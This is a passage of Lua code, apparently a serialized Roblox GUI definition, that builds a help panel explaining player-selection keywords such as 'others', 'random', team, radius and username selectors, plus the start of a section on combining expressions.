		Text = "others",
		TextColor3 = Color3.new(1, 1, 1),
		TextSize = 14,
		TextWrapped = true,
		TextXAlignment = 0,
		ZIndex = 10,
	}

	tbl38[1] = 19
	tbl38[2] = "TextLabel"
	tbl38[3] = tbl39
	local tbl40
	tbl40 = {}

	local tbl41 = {
		BackgroundColor3 = Color3.new(1, 1, 1),
		BackgroundTransparency = 1,
		Font = 3,
		Name = "CaseDesc",
		Parent = { 18 },
		Position = UDim2.new(0, 37, 0, 0),
		Size = UDim2.new(1, 0, 1, 0),
		Text = "- includes everyone except you",
		TextColor3 = Color3.new(1, 1, 1),
		TextSize = 14,
		TextWrapped = true,
		TextXAlignment = 0,
		ZIndex = 10,
	}

	tbl40[1] = 20
	tbl40[2] = "TextLabel"
	tbl40[3] = tbl41
	local tbl42
	tbl42 = {}

	local tbl43 = {
		BackgroundColor3 = Color3.new(0.1803921610117, 0.1803921610117, 0.1843137294054),
		BackgroundTransparency = 1,
		BorderSizePixel = 0,
		LayoutOrder = -2,
		Name = "Case",
		Parent = { 13 },
		Position = UDim2.new(0, 8, 0, 60),
		Size = UDim2.new(1, 0, 0, 18),
		ZIndex = 10,
	}

	tbl42[1] = 21
	tbl42[2] = "Frame"
	tbl42[3] = tbl43
	local tbl44
	tbl44 = {}

	local tbl45 = {
		BackgroundColor3 = Color3.new(1, 1, 1),
		BackgroundTransparency = 1,
		Font = 4,
		Name = "CaseName",
		Parent = { 21 },
		Size = UDim2.new(1, 0, 1, 0),
		Text = "me",
		TextColor3 = Color3.new(1, 1, 1),
		TextSize = 14,
		TextWrapped = true,
		TextXAlignment = 0,
		ZIndex = 10,
	}

	tbl44[1] = 22
	tbl44[2] = "TextLabel"
	tbl44[3] = tbl45
	local tbl46
	tbl46 = {}

	local tbl47 = {
		BackgroundColor3 = Color3.new(1, 1, 1),
		BackgroundTransparency = 1,
		Font = 3,
		Name = "CaseDesc",
		Parent = { 21 },
		Position = UDim2.new(0, 19, 0, 0),
		Size = UDim2.new(1, 0, 1, 0),
		Text = "- includes your player only",
		TextColor3 = Color3.new(1, 1, 1),
		TextSize = 14,
		TextWrapped = true,
		TextXAlignment = 0,
		ZIndex = 10,
	}

	tbl46[1] = 23
	tbl46[2] = "TextLabel"
	tbl46[3] = tbl47
	local tbl48
	tbl48 = {}

	local tbl49 = {
		BackgroundColor3 = Color3.new(0.1803921610117, 0.1803921610117, 0.1843137294054),
		BackgroundTransparency = 1,
		BorderSizePixel = 0,
		Name = "Case",
		Parent = { 13 },
		Position = UDim2.new(0, 8, 0, 60),
		Size = UDim2.new(1, 0, 0, 18),
		ZIndex = 10,
	}

	tbl48[1] = 24
	tbl48[2] = "Frame"
	tbl48[3] = tbl49
	local tbl50
	tbl50 = {}

	local tbl51 = {
		BackgroundColor3 = Color3.new(1, 1, 1),
		BackgroundTransparency = 1,
		Font = 4,
		Name = "CaseName",
		Parent = { 24 },
		Size = UDim2.new(1, 0, 1, 0),
		Text = "#[number]",
		TextColor3 = Color3.new(1, 1, 1),
		TextSize = 14,
		TextWrapped = true,
		TextXAlignment = 0,
		ZIndex = 10,
	}

	tbl50[1] = 25
	tbl50[2] = "TextLabel"
	tbl50[3] = tbl51
	local tbl52
	tbl52 = {}

	local tbl53 = {
		BackgroundColor3 = Color3.new(1, 1, 1),
		BackgroundTransparency = 1,
		Font = 3,
		Name = "CaseDesc",
		Parent = { 24 },
		Position = UDim2.new(0, 59, 0, 0),
		Size = UDim2.new(1, 0, 1, 0),
		Text = "- gets a specified amount of random players",
		TextColor3 = Color3.new(1, 1, 1),
		TextSize = 14,
		TextWrapped = true,
		TextXAlignment = 0,
		ZIndex = 10,
	}

	tbl52[1] = 26
	tbl52[2] = "TextLabel"
	tbl52[3] = tbl53
	local tbl54
	tbl54 = {}

	local tbl55 = {
		BackgroundColor3 = Color3.new(0.1803921610117, 0.1803921610117, 0.1843137294054),
		BackgroundTransparency = 1,
		BorderSizePixel = 0,
		Name = "Case",
		Parent = { 13 },
		Position = UDim2.new(0, 8, 0, 60),
		Size = UDim2.new(1, 0, 0, 18),
		ZIndex = 10,
	}

	tbl54[1] = 27
	tbl54[2] = "Frame"
	tbl54[3] = tbl55
	local tbl56
	tbl56 = {}

	local tbl57 = {
		BackgroundColor3 = Color3.new(1, 1, 1),
		BackgroundTransparency = 1,
		Font = 4,
		Name = "CaseName",
		Parent = { 27 },
		Size = UDim2.new(1, 0, 1, 0),
		Text = "random",
		TextColor3 = Color3.new(1, 1, 1),
		TextSize = 14,
		TextWrapped = true,
		TextXAlignment = 0,
		ZIndex = 10,
	}

	tbl56[1] = 28
	tbl56[2] = "TextLabel"
	tbl56[3] = tbl57
	local tbl58
	tbl58 = {}

	local tbl59 = {
		BackgroundColor3 = Color3.new(1, 1, 1),
		BackgroundTransparency = 1,
		Font = 3,
		Name = "CaseDesc",
		Parent = { 27 },
		Position = UDim2.new(0, 44, 0, 0),
		Size = UDim2.new(1, 0, 1, 0),
		Text = "- affects a random player",
		TextColor3 = Color3.new(1, 1, 1),
		TextSize = 14,
		TextWrapped = true,
		TextXAlignment = 0,
		ZIndex = 10,
	}

	tbl58[1] = 29
	tbl58[2] = "TextLabel"
	tbl58[3] = tbl59
	local tbl60
	tbl60 = {}

	local tbl61 = {
		BackgroundColor3 = Color3.new(0.1803921610117, 0.1803921610117, 0.1843137294054),
		BackgroundTransparency = 1,
		BorderSizePixel = 0,
		Name = "Case",
		Parent = { 13 },
		Position = UDim2.new(0, 8, 0, 60),
		Size = UDim2.new(1, 0, 0, 18),
		ZIndex = 10,
	}

	tbl60[1] = 30
	tbl60[2] = "Frame"
	tbl60[3] = tbl61
	local tbl62
	tbl62 = {}

	local tbl63 = {
		BackgroundColor3 = Color3.new(1, 1, 1),
		BackgroundTransparency = 1,
		Font = 4,
		Name = "CaseName",
		Parent = { 30 },
		Size = UDim2.new(1, 0, 1, 0),
		Text = "%[team name]",
		TextColor3 = Color3.new(1, 1, 1),
		TextSize = 14,
		TextWrapped = true,
		TextXAlignment = 0,
		ZIndex = 10,
	}

	tbl62[1] = 31
	tbl62[2] = "TextLabel"
	tbl62[3] = tbl63
	local tbl64
	tbl64 = {}

	local tbl65 = {
		BackgroundColor3 = Color3.new(1, 1, 1),
		BackgroundTransparency = 1,
		Font = 3,
		Name = "CaseDesc",
		Parent = { 30 },
		Position = UDim2.new(0, 78, 0, 0),
		Size = UDim2.new(1, 0, 1, 0),
		Text = "- includes everyone on a given team",
		TextColor3 = Color3.new(1, 1, 1),
		TextSize = 14,
		TextWrapped = true,
		TextXAlignment = 0,
		ZIndex = 10,
	}

	tbl64[1] = 32
	tbl64[2] = "TextLabel"
	tbl64[3] = tbl65
	local tbl66
	tbl66 = {}

	local tbl67 = {
		BackgroundColor3 = Color3.new(0.1803921610117, 0.1803921610117, 0.1843137294054),
		BackgroundTransparency = 1,
		BorderSizePixel = 0,
		Name = "Case",
		Parent = { 13 },
		Position = UDim2.new(0, 8, 0, 60),
		Size = UDim2.new(1, 0, 0, 18),
		ZIndex = 10,
	}

	tbl66[1] = 33
	tbl66[2] = "Frame"
	tbl66[3] = tbl67
	local tbl68
	tbl68 = {}

	local tbl69 = {
		BackgroundColor3 = Color3.new(1, 1, 1),
		BackgroundTransparency = 1,
		Font = 4,
		Name = "CaseName",
		Parent = { 33 },
		Size = UDim2.new(1, 0, 1, 0),
		Text = "allies / team",
		TextColor3 = Color3.new(1, 1, 1),
		TextSize = 14,
		TextWrapped = true,
		TextXAlignment = 0,
		ZIndex = 10,
	}

	tbl68[1] = 34
	tbl68[2] = "TextLabel"
	tbl68[3] = tbl69
	local tbl70
	tbl70 = {}

	local tbl71 = {
		BackgroundColor3 = Color3.new(1, 1, 1),
		BackgroundTransparency = 1,
		Font = 3,
		Name = "CaseDesc",
		Parent = { 33 },
		Position = UDim2.new(0, 63, 0, 0),
		Size = UDim2.new(1, 0, 1, 0),
		Text = "- players who are on your team",
		TextColor3 = Color3.new(1, 1, 1),
		TextSize = 14,
		TextWrapped = true,
		TextXAlignment = 0,
		ZIndex = 10,
	}

	tbl70[1] = 35
	tbl70[2] = "TextLabel"
	tbl70[3] = tbl71
	local tbl72
	tbl72 = {}

	local tbl73 = {
		BackgroundColor3 = Color3.new(0.1803921610117, 0.1803921610117, 0.1843137294054),
		BackgroundTransparency = 1,
		BorderSizePixel = 0,
		Name = "Case",
		Parent = { 13 },
		Position = UDim2.new(0, 8, 0, 60),
		Size = UDim2.new(1, 0, 0, 18),
		ZIndex = 10,
	}

	tbl72[1] = 36
	tbl72[2] = "Frame"
	tbl72[3] = tbl73
	local tbl74
	tbl74 = {}

	local tbl75 = {
		BackgroundColor3 = Color3.new(1, 1, 1),
		BackgroundTransparency = 1,
		Font = 4,
		Name = "CaseName",
		Parent = { 36 },
		Size = UDim2.new(1, 0, 1, 0),
		Text = "enemies / nonteam",
		TextColor3 = Color3.new(1, 1, 1),
		TextSize = 14,
		TextWrapped = true,
		TextXAlignment = 0,
		ZIndex = 10,
	}

	tbl74[1] = 37
	tbl74[2] = "TextLabel"
	tbl74[3] = tbl75
	local tbl76
	tbl76 = {}

	local tbl77 = {
		BackgroundColor3 = Color3.new(1, 1, 1),
		BackgroundTransparency = 1,
		Font = 3,
		Name = "CaseDesc",
		Parent = { 36 },
		Position = UDim2.new(0, 101, 0, 0),
		Size = UDim2.new(1, 0, 1, 0),
		Text = "- players who are not on your team",
		TextColor3 = Color3.new(1, 1, 1),
		TextSize = 14,
		TextWrapped = true,
		TextXAlignment = 0,
		ZIndex = 10,
	}

	tbl76[1] = 38
	tbl76[2] = "TextLabel"
	tbl76[3] = tbl77
	local tbl78
	tbl78 = {}

	local tbl79 = {
		BackgroundColor3 = Color3.new(0.1803921610117, 0.1803921610117, 0.1843137294054),
		BackgroundTransparency = 1,
		BorderSizePixel = 0,
		Name = "Case",
		Parent = { 13 },
		Position = UDim2.new(0, 8, 0, 60),
		Size = UDim2.new(1, 0, 0, 18),
		ZIndex = 10,
	}

	tbl78[1] = 39
	tbl78[2] = "Frame"
	tbl78[3] = tbl79
	local tbl80
	tbl80 = {}

	local tbl81 = {
		BackgroundColor3 = Color3.new(1, 1, 1),
		BackgroundTransparency = 1,
		Font = 4,
		Name = "CaseName",
		Parent = { 39 },
		Size = UDim2.new(1, 0, 1, 0),
		Text = "friends",
		TextColor3 = Color3.new(1, 1, 1),
		TextSize = 14,
		TextWrapped = true,
		TextXAlignment = 0,
		ZIndex = 10,
	}

	tbl80[1] = 40
	tbl80[2] = "TextLabel"
	tbl80[3] = tbl81
	local tbl82
	tbl82 = {}

	local tbl83 = {
		BackgroundColor3 = Color3.new(1, 1, 1),
		BackgroundTransparency = 1,
		Font = 3,
		Name = "CaseDesc",
		Parent = { 39 },
		Position = UDim2.new(0, 40, 0, 0),
		Size = UDim2.new(1, 0, 1, 0),
		Text = "- anyone who is friends with you",
		TextColor3 = Color3.new(1, 1, 1),
		TextSize = 14,
		TextWrapped = true,
		TextXAlignment = 0,
		ZIndex = 10,
	}

	tbl82[1] = 41
	tbl82[2] = "TextLabel"
	tbl82[3] = tbl83
	local tbl84
	tbl84 = {}

	local tbl85 = {
		BackgroundColor3 = Color3.new(0.1803921610117, 0.1803921610117, 0.1843137294054),
		BackgroundTransparency = 1,
		BorderSizePixel = 0,
		Name = "Case",
		Parent = { 13 },
		Position = UDim2.new(0, 8, 0, 60),
		Size = UDim2.new(1, 0, 0, 18),
		ZIndex = 10,
	}

	tbl84[1] = 42
	tbl84[2] = "Frame"
	tbl84[3] = tbl85
	local tbl86
	tbl86 = {}

	local tbl87 = {
		BackgroundColor3 = Color3.new(1, 1, 1),
		BackgroundTransparency = 1,
		Font = 4,
		Name = "CaseName",
		Parent = { 42 },
		Size = UDim2.new(1, 0, 1, 0),
		Text = "nonfriends",
		TextColor3 = Color3.new(1, 1, 1),
		TextSize = 14,
		TextWrapped = true,
		TextXAlignment = 0,
		ZIndex = 10,
	}

	tbl86[1] = 43
	tbl86[2] = "TextLabel"
	tbl86[3] = tbl87
	local tbl88
	tbl88 = {}

	local tbl89 = {
		BackgroundColor3 = Color3.new(1, 1, 1),
		BackgroundTransparency = 1,
		Font = 3,
		Name = "CaseDesc",
		Parent = { 42 },
		Position = UDim2.new(0, 61, 0, 0),
		Size = UDim2.new(1, 0, 1, 0),
		Text = "- anyone who is not friends with you",
		TextColor3 = Color3.new(1, 1, 1),
		TextSize = 14,
		TextWrapped = true,
		TextXAlignment = 0,
		ZIndex = 10,
	}

	tbl88[1] = 44
	tbl88[2] = "TextLabel"
	tbl88[3] = tbl89
	local tbl90
	tbl90 = {}

	local tbl91 = {
		BackgroundColor3 = Color3.new(0.1803921610117, 0.1803921610117, 0.1843137294054),
		BackgroundTransparency = 1,
		BorderSizePixel = 0,
		Name = "Case",
		Parent = { 13 },
		Position = UDim2.new(0, 8, 0, 60),
		Size = UDim2.new(1, 0, 0, 18),
		ZIndex = 10,
	}

	tbl90[1] = 45
	tbl90[2] = "Frame"
	tbl90[3] = tbl91
	local tbl92
	tbl92 = {}

	local tbl93 = {
		BackgroundColor3 = Color3.new(1, 1, 1),
		BackgroundTransparency = 1,
		Font = 4,
		Name = "CaseName",
		Parent = { 45 },
		Size = UDim2.new(1, 0, 1, 0),
		Text = "guests",
		TextColor3 = Color3.new(1, 1, 1),
		TextSize = 14,
		TextWrapped = true,
		TextXAlignment = 0,
		ZIndex = 10,
	}

	tbl92[1] = 46
	tbl92[2] = "TextLabel"
	tbl92[3] = tbl93
	local tbl94
	tbl94 = {}

	local tbl95 = {
		BackgroundColor3 = Color3.new(1, 1, 1),
		BackgroundTransparency = 1,
		Font = 3,
		Name = "CaseDesc",
		Parent = { 45 },
		Position = UDim2.new(0, 36, 0, 0),
		Size = UDim2.new(1, 0, 1, 0),
		Text = "- guest players (obsolete)",
		TextColor3 = Color3.new(1, 1, 1),
		TextSize = 14,
		TextWrapped = true,
		TextXAlignment = 0,
		ZIndex = 10,
	}

	tbl94[1] = 47
	tbl94[2] = "TextLabel"
	tbl94[3] = tbl95
	local tbl96
	tbl96 = {}

	local tbl97 = {
		BackgroundColor3 = Color3.new(0.1803921610117, 0.1803921610117, 0.1843137294054),
		BackgroundTransparency = 1,
		BorderSizePixel = 0,
		Name = "Case",
		Parent = { 13 },
		Position = UDim2.new(0, 8, 0, 60),
		Size = UDim2.new(1, 0, 0, 18),
		ZIndex = 10,
	}

	tbl96[1] = 48
	tbl96[2] = "Frame"
	tbl96[3] = tbl97
	local tbl98
	tbl98 = {}

	local tbl99 = {
		BackgroundColor3 = Color3.new(1, 1, 1),
		BackgroundTransparency = 1,
		Font = 4,
		Name = "CaseName",
		Parent = { 48 },
		Size = UDim2.new(1, 0, 1, 0),
		Text = "bacons",
		TextColor3 = Color3.new(1, 1, 1),
		TextSize = 14,
		TextWrapped = true,
		TextXAlignment = 0,
		ZIndex = 10,
	}

	tbl98[1] = 49
	tbl98[2] = "TextLabel"
	tbl98[3] = tbl99
	local tbl100
	tbl100 = {}

	local tbl101 = {
		BackgroundColor3 = Color3.new(1, 1, 1),
		BackgroundTransparency = 1,
		Font = 3,
		Name = "CaseDesc",
		Parent = { 48 },
		Position = UDim2.new(0, 40, 0, 0),
		Size = UDim2.new(1, 0, 1, 0),
		Text = "- anyone with the \"bacon\" or pal hair",
		TextColor3 = Color3.new(1, 1, 1),
		TextSize = 14,
		TextWrapped = true,
		TextXAlignment = 0,
		ZIndex = 10,
	}

	tbl100[1] = 50
	tbl100[2] = "TextLabel"
	tbl100[3] = tbl101
	local tbl102
	tbl102 = {}

	local tbl103 = {
		BackgroundColor3 = Color3.new(0.1803921610117, 0.1803921610117, 0.1843137294054),
		BackgroundTransparency = 1,
		BorderSizePixel = 0,
		Name = "Case",
		Parent = { 13 },
		Position = UDim2.new(0, 8, 0, 60),
		Size = UDim2.new(1, 0, 0, 18),
		ZIndex = 10,
	}

	tbl102[1] = 51
	tbl102[2] = "Frame"
	tbl102[3] = tbl103
	local tbl104
	tbl104 = {}

	local tbl105 = {
		BackgroundColor3 = Color3.new(1, 1, 1),
		BackgroundTransparency = 1,
		Font = 4,
		Name = "CaseName",
		Parent = { 51 },
		Size = UDim2.new(1, 0, 1, 0),
		Text = "age[number]",
		TextColor3 = Color3.new(1, 1, 1),
		TextSize = 14,
		TextWrapped = true,
		TextXAlignment = 0,
		ZIndex = 10,
	}

	tbl104[1] = 52
	tbl104[2] = "TextLabel"
	tbl104[3] = tbl105
	local tbl106
	tbl106 = {}

	local tbl107 = {
		BackgroundColor3 = Color3.new(1, 1, 1),
		BackgroundTransparency = 1,
		Font = 3,
		Name = "CaseDesc",
		Parent = { 51 },
		Position = UDim2.new(0, 71, 0, 0),
		Size = UDim2.new(1, 0, 1, 0),
		Text = "- includes anyone below or at the given age",
		TextColor3 = Color3.new(1, 1, 1),
		TextSize = 14,
		TextWrapped = true,
		TextXAlignment = 0,
		ZIndex = 10,
	}

	tbl106[1] = 53
	tbl106[2] = "TextLabel"
	tbl106[3] = tbl107
	local tbl108
	tbl108 = {}

	local tbl109 = {
		BackgroundColor3 = Color3.new(0.1803921610117, 0.1803921610117, 0.1843137294054),
		BackgroundTransparency = 1,
		BorderSizePixel = 0,
		Name = "Case",
		Parent = { 13 },
		Position = UDim2.new(0, 8, 0, 60),
		Size = UDim2.new(1, 0, 0, 18),
		ZIndex = 10,
	}

	tbl108[1] = 54
	tbl108[2] = "Frame"
	tbl108[3] = tbl109
	local tbl110
	tbl110 = {}

	local tbl111 = {
		BackgroundColor3 = Color3.new(1, 1, 1),
		BackgroundTransparency = 1,
		Font = 4,
		Name = "CaseName",
		Parent = { 54 },
		Size = UDim2.new(1, 0, 1, 0),
		Text = "rad[number]",
		TextColor3 = Color3.new(1, 1, 1),
		TextSize = 14,
		TextWrapped = true,
		TextXAlignment = 0,
		ZIndex = 10,
	}

	tbl110[1] = 55
	tbl110[2] = "TextLabel"
	tbl110[3] = tbl111
	local tbl112
	tbl112 = {}

	local tbl113 = {
		BackgroundColor3 = Color3.new(1, 1, 1),
		BackgroundTransparency = 1,
		Font = 3,
		Name = "CaseDesc",
		Parent = { 54 },
		Position = UDim2.new(0, 70, 0, 0),
		Size = UDim2.new(1, 0, 1, 0),
		Text = "- includes anyone within the given radius",
		TextColor3 = Color3.new(1, 1, 1),
		TextSize = 14,
		TextWrapped = true,
		TextXAlignment = 0,
		ZIndex = 10,
	}

	tbl112[1] = 56
	tbl112[2] = "TextLabel"
	tbl112[3] = tbl113
	local tbl114
	tbl114 = {}

	local tbl115 = {
		BackgroundColor3 = Color3.new(0.1803921610117, 0.1803921610117, 0.1843137294054),
		BackgroundTransparency = 1,
		BorderSizePixel = 0,
		Name = "Case",
		Parent = { 13 },
		Position = UDim2.new(0, 8, 0, 60),
		Size = UDim2.new(1, 0, 0, 18),
		ZIndex = 10,
	}

	tbl114[1] = 57
	tbl114[2] = "Frame"
	tbl114[3] = tbl115
	local tbl116
	tbl116 = {}

	local tbl117 = {
		BackgroundColor3 = Color3.new(1, 1, 1),
		BackgroundTransparency = 1,
		Font = 4,
		Name = "CaseName",
		Parent = { 57 },
		Size = UDim2.new(1, 0, 1, 0),
		Text = "nearest",
		TextColor3 = Color3.new(1, 1, 1),
		TextSize = 14,
		TextWrapped = true,
		TextXAlignment = 0,
		ZIndex = 10,
	}

	tbl116[1] = 58
	tbl116[2] = "TextLabel"
	tbl116[3] = tbl117
	local tbl118
	tbl118 = {}

	local tbl119 = {
		BackgroundColor3 = Color3.new(1, 1, 1),
		BackgroundTransparency = 1,
		Font = 3,
		Name = "CaseDesc",
		Parent = { 57 },
		Position = UDim2.new(0, 43, 0, 0),
		Size = UDim2.new(1, 0, 1, 0),
		Text = "- gets the closest player to you",
		TextColor3 = Color3.new(1, 1, 1),
		TextSize = 14,
		TextWrapped = true,
		TextXAlignment = 0,
		ZIndex = 10,
	}

	tbl118[1] = 59
	tbl118[2] = "TextLabel"
	tbl118[3] = tbl119
	local tbl120
	tbl120 = {}

	local tbl121 = {
		BackgroundColor3 = Color3.new(0.1803921610117, 0.1803921610117, 0.1843137294054),
		BackgroundTransparency = 1,
		BorderSizePixel = 0,
		Name = "Case",
		Parent = { 13 },
		Position = UDim2.new(0, 8, 0, 60),
		Size = UDim2.new(1, 0, 0, 18),
		ZIndex = 10,
	}

	tbl120[1] = 60
	tbl120[2] = "Frame"
	tbl120[3] = tbl121
	local tbl122
	tbl122 = {}

	local tbl123 = {
		BackgroundColor3 = Color3.new(1, 1, 1),
		BackgroundTransparency = 1,
		Font = 4,
		Name = "CaseName",
		Parent = { 60 },
		Size = UDim2.new(1, 0, 1, 0),
		Text = "farthest",
		TextColor3 = Color3.new(1, 1, 1),
		TextSize = 14,
		TextWrapped = true,
		TextXAlignment = 0,
		ZIndex = 10,
	}

	tbl122[1] = 61
	tbl122[2] = "TextLabel"
	tbl122[3] = tbl123
	local tbl124
	tbl124 = {}

	local tbl125 = {
		BackgroundColor3 = Color3.new(1, 1, 1),
		BackgroundTransparency = 1,
		Font = 3,
		Name = "CaseDesc",
		Parent = { 60 },
		Position = UDim2.new(0, 46, 0, 0),
		Size = UDim2.new(1, 0, 1, 0),
		Text = "- gets the farthest player from you",
		TextColor3 = Color3.new(1, 1, 1),
		TextSize = 14,
		TextWrapped = true,
		TextXAlignment = 0,
		ZIndex = 10,
	}

	tbl124[1] = 62
	tbl124[2] = "TextLabel"
	tbl124[3] = tbl125
	local tbl126
	tbl126 = {}

	local tbl127 = {
		BackgroundColor3 = Color3.new(0.1803921610117, 0.1803921610117, 0.1843137294054),
		BackgroundTransparency = 1,
		BorderSizePixel = 0,
		Name = "Case",
		Parent = { 13 },
		Position = UDim2.new(0, 8, 0, 60),
		Size = UDim2.new(1, 0, 0, 18),
		ZIndex = 10,
	}

	tbl126[1] = 63
	tbl126[2] = "Frame"
	tbl126[3] = tbl127
	local tbl128
	tbl128 = {}

	local tbl129 = {
		BackgroundColor3 = Color3.new(1, 1, 1),
		BackgroundTransparency = 1,
		Font = 4,
		Name = "CaseName",
		Parent = { 63 },
		Size = UDim2.new(1, 0, 1, 0),
		Text = "group[ID]",
		TextColor3 = Color3.new(1, 1, 1),
		TextSize = 14,
		TextWrapped = true,
		TextXAlignment = 0,
		ZIndex = 10,
	}

	tbl128[1] = 64
	tbl128[2] = "TextLabel"
	tbl128[3] = tbl129
	local tbl130
	tbl130 = {}

	local tbl131 = {
		BackgroundColor3 = Color3.new(1, 1, 1),
		BackgroundTransparency = 1,
		Font = 3,
		Name = "CaseDesc",
		Parent = { 63 },
		Position = UDim2.new(0, 55, 0, 0),
		Size = UDim2.new(1, 0, 1, 0),
		Text = "- gets players who are in a certain group",
		TextColor3 = Color3.new(1, 1, 1),
		TextSize = 14,
		TextWrapped = true,
		TextXAlignment = 0,
		ZIndex = 10,
	}

	tbl130[1] = 65
	tbl130[2] = "TextLabel"
	tbl130[3] = tbl131
	local tbl132
	tbl132 = {}

	local tbl133 = {
		BackgroundColor3 = Color3.new(0.1803921610117, 0.1803921610117, 0.1843137294054),
		BackgroundTransparency = 1,
		BorderSizePixel = 0,
		Name = "Case",
		Parent = { 13 },
		Position = UDim2.new(0, 8, 0, 60),
		Size = UDim2.new(1, 0, 0, 18),
		ZIndex = 10,
	}

	tbl132[1] = 66
	tbl132[2] = "Frame"
	tbl132[3] = tbl133
	local tbl134
	tbl134 = {}

	local tbl135 = {
		BackgroundColor3 = Color3.new(1, 1, 1),
		BackgroundTransparency = 1,
		Font = 4,
		Name = "CaseName",
		Parent = { 66 },
		Size = UDim2.new(1, 0, 1, 0),
		Text = "alive",
		TextColor3 = Color3.new(1, 1, 1),
		TextSize = 14,
		TextWrapped = true,
		TextXAlignment = 0,
		ZIndex = 10,
	}

	tbl134[1] = 67
	tbl134[2] = "TextLabel"
	tbl134[3] = tbl135
	local tbl136
	tbl136 = {}

	local tbl137 = {
		BackgroundColor3 = Color3.new(1, 1, 1),
		BackgroundTransparency = 1,
		Font = 3,
		Name = "CaseDesc",
		Parent = { 66 },
		Position = UDim2.new(0, 27, 0, 0),
		Size = UDim2.new(1, 0, 1, 0),
		Text = "- gets players who are alive",
		TextColor3 = Color3.new(1, 1, 1),
		TextSize = 14,
		TextWrapped = true,
		TextXAlignment = 0,
		ZIndex = 10,
	}

	tbl136[1] = 68
	tbl136[2] = "TextLabel"
	tbl136[3] = tbl137
	local tbl138
	tbl138 = {}

	local tbl139 = {
		BackgroundColor3 = Color3.new(0.1803921610117, 0.1803921610117, 0.1843137294054),
		BackgroundTransparency = 1,
		BorderSizePixel = 0,
		Name = "Case",
		Parent = { 13 },
		Position = UDim2.new(0, 8, 0, 60),
		Size = UDim2.new(1, 0, 0, 18),
		ZIndex = 10,
	}

	tbl138[1] = 69
	tbl138[2] = "Frame"
	tbl138[3] = tbl139
	local tbl140
	tbl140 = {}

	local tbl141 = {
		BackgroundColor3 = Color3.new(1, 1, 1),
		BackgroundTransparency = 1,
		Font = 4,
		Name = "CaseName",
		Parent = { 69 },
		Size = UDim2.new(1, 0, 1, 0),
		Text = "dead",
		TextColor3 = Color3.new(1, 1, 1),
		TextSize = 14,
		TextWrapped = true,
		TextXAlignment = 0,
		ZIndex = 10,
	}

	tbl140[1] = 70
	tbl140[2] = "TextLabel"
	tbl140[3] = tbl141
	local tbl142
	tbl142 = {}

	local tbl143 = {
		BackgroundColor3 = Color3.new(1, 1, 1),
		BackgroundTransparency = 1,
		Font = 3,
		Name = "CaseDesc",
		Parent = { 69 },
		Position = UDim2.new(0, 29, 0, 0),
		Size = UDim2.new(1, 0, 1, 0),
		Text = "- gets players who are dead",
		TextColor3 = Color3.new(1, 1, 1),
		TextSize = 14,
		TextWrapped = true,
		TextXAlignment = 0,
		ZIndex = 10,
	}

	tbl142[1] = 71
	tbl142[2] = "TextLabel"
	tbl142[3] = tbl143
	local tbl144
	tbl144 = {}

	local tbl145 = {
		BackgroundColor3 = Color3.new(0.1803921610117, 0.1803921610117, 0.1843137294054),
		BackgroundTransparency = 1,
		BorderSizePixel = 0,
		LayoutOrder = -1,
		Name = "Case",
		Parent = { 13 },
		Position = UDim2.new(0, 8, 0, 60),
		Size = UDim2.new(1, 0, 0, 18),
		ZIndex = 10,
	}

	tbl144[1] = 72
	tbl144[2] = "Frame"
	tbl144[3] = tbl145

	do
		local tbl146
		tbl146 = {}

		do
			local tbl147 = {
				BackgroundColor3 = Color3.new(1, 1, 1),
				BackgroundTransparency = 1,
				Font = 4,
				Name = "CaseName",
				Parent = { 72 },
				Size = UDim2.new(1, 0, 1, 0),
				Text = "@username",
				TextColor3 = Color3.new(1, 1, 1),
				TextSize = 14,
				TextWrapped = true,
				TextXAlignment = 0,
				ZIndex = 10,
			}

			tbl146[1] = 73
			tbl146[2] = "TextLabel"
			tbl146[3] = tbl147
		end

		local tbl147
		tbl147 = {}

		do
			local tbl148 = {
				BackgroundColor3 = Color3.new(1, 1, 1),
				BackgroundTransparency = 1,
				Font = 3,
				Name = "CaseDesc",
				Parent = { 72 },
				Position = UDim2.new(0, 66, 0, 0),
				Size = UDim2.new(1, 0, 1, 0),
				Text = "- searches for players by username only (ignores displaynames)",
				TextColor3 = Color3.new(1, 1, 1),
				TextSize = 14,
				TextWrapped = true,
				TextXAlignment = 0,
				ZIndex = 10,
			}

			tbl147[1] = 74
			tbl147[2] = "TextLabel"
			tbl147[3] = tbl148
		end

		local tbl148
		tbl148 = {}

		do
			local tbl149 = {
				BackgroundColor3 = Color3.new(1, 1, 1),
				BackgroundTransparency = 1,
				Name = "Section",
				Parent = { 7 },
				Size = UDim2.new(1, 0, 0, 180),
				ZIndex = 10,
			}

			tbl148[1] = 75
			tbl148[2] = "Frame"
			tbl148[3] = tbl149
		end

		local tbl149
		tbl149 = {}

		do
			local tbl150 = {
				BackgroundColor3 = Color3.new(1, 1, 1),
				BackgroundTransparency = 1,
				Font = 4,
				Name = "Header",
				Parent = { 75 },
				Position = UDim2.new(0, 8, 0, 5),
				Size = UDim2.new(1, -8, 0, 20),
				Text = "Various Operators",
				TextColor3 = Color3.new(1, 1, 1),
				TextSize = 20,
				TextXAlignment = 0,
				ZIndex = 10,
			}

			tbl149[1] = 76
			tbl149[2] = "TextLabel"
			tbl149[3] = tbl150
		end

		local tbl150
		tbl150 = {}

		do
			local tbl151 = {
				BackgroundColor3 = Color3.new(0.1803921610117, 0.1803921610117, 0.1843137294054),
				BorderSizePixel = 0,
				Name = "Line",
				Parent = { 75 },
				Position = UDim2.new(0, 10, 1, -1),
				Size = UDim2.new(1, -20, 0, 1),
				ZIndex = 10,
			}

			tbl150[1] = 77
			tbl150[2] = "Frame"
			tbl150[3] = tbl151
		end

		local tbl151
		tbl151 = {}

		do
			local tbl152 = {
				BackgroundColor3 = Color3.new(1, 1, 1),
				BackgroundTransparency = 1,
				Font = 4,
				Name = "Text",
				Parent = { 75 },
				Position = UDim2.new(0, 8, 0, 30),
				Size = UDim2.new(1, -8, 0, 16),
				Text = "Use commas to separate multiple expressions:",
				TextColor3 = Color3.new(1, 1, 1),
				TextSize = 14,
				TextWrapped = true,
				TextXAlignment = 0,
				TextYAlignment = 0,
				ZIndex = 10,
			}

			tbl151[1] = 78
			tbl151[2] = "TextLabel"
			tbl151[3] = tbl152
		end

		local tbl152
		tbl152 = {}

		do
			local tbl153 = {
				BackgroundColor3 = Color3.new(1, 1, 1),
				BackgroundTransparency = 1,
				Font = 4,
				Name = "Text",
				Parent = { 75 },
				Position = UDim2.new(0, 8, 0, 75),
				Size = UDim2.new(1, -8, 0, 16),
				Text = "Use - to exclude, and + to include players in your expression:",
				TextColor3 = Color3.new(1, 1, 1),
				TextSize = 14,
				TextWrapped = true,
				TextXAlignment = 0,
